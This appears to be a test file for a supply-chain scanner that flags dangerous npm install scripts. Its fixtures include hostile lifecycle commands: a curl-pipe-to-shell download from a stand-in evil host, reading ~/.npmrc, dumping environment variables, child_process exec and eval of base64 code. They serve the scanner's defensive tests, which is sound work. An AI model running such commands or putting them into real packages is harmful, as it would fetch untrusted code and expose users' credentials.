import { test, expect, describe } from "bun:test";
import { analyzeScripts, type InstalledPackage } from "../src/index";

const pkg = (name: string, scripts: Record<string, string>): InstalledPackage => ({ name, dir: `/x/${name}`, scripts, layout: "npm" });

const has = (fs: { ruleId: string; pkg: string }[], pkg: string, ruleId: string) => fs.some((f) => f.pkg === pkg && f.ruleId === ruleId);

describe("AC2.1/2.2/2.3 malicious scripts", () => {
  test("curl | sh ⇒ critical + network high", () => {
    const f = analyzeScripts([pkg("evil", { postinstall: "curl http://evil.example/x | sh" })]);
    expect(has(f, "evil", "WG-SHELL-PIPE")).toBe(true);
    expect(f.find((x) => x.ruleId === "WG-SHELL-PIPE")!.severity).toBe("critical");
    expect(has(f, "evil", "WG-NET-DOWNLOAD")).toBe(true);
  });
  test("secret/env/child_process/eval/base64 flagged", () => {
    const f = analyzeScripts([
      pkg("a", { preinstall: "node -e \"require('child_process').exec('id')\"" }),
      pkg("b", { postinstall: "node -e \"console.log(process.env)\"" }),
      pkg("c", { install: "cat ~/.npmrc" }),
      pkg("d", { postinstall: "node -e \"eval(Buffer.from('x','base64').toString())\"" }),
    ]);
    expect(has(f, "a", "WG-CHILD-PROCESS")).toBe(true);
    expect(has(f, "b", "WG-ENV-ENUM")).toBe(true);
    expect(has(f, "c", "WG-SECRET-PATH")).toBe(true);
    expect(has(f, "d", "WG-EVAL")).toBe(true);
    expect(has(f, "d", "WG-BASE64")).toBe(true);
  });
});

describe("AC2.4 false-positive guard", () => {
  test("benign build scripts ⇒ no critical/high (only low advisory)", () => {
    const f = analyzeScripts([
      pkg("ok1", { prepare: "tsc -b" }),
      pkg("ok2", { postinstall: "node-gyp rebuild" }),
      pkg("ok3", { install: "prebuild-install || node-gyp rebuild" }),
    ]);
    expect(f.every((x) => x.severity === "low")).toBe(true);
    expect(f.some((x) => x.ruleId === "WG-INSTALL-SCRIPT")).toBe(true);
  });
});

describe("AC2.5 determinism", () => {
  test("stable sorted output", () => {
    const input = [pkg("z", { postinstall: "curl http://x | sh" }), pkg("a", { install: "tsc" })];
    const a = analyzeScripts(input);
    const b = analyzeScripts(input);
    expect(a).toEqual(b);
    // highest severity first
    expect(a[0]!.severity).toBe("critical");
  });
});
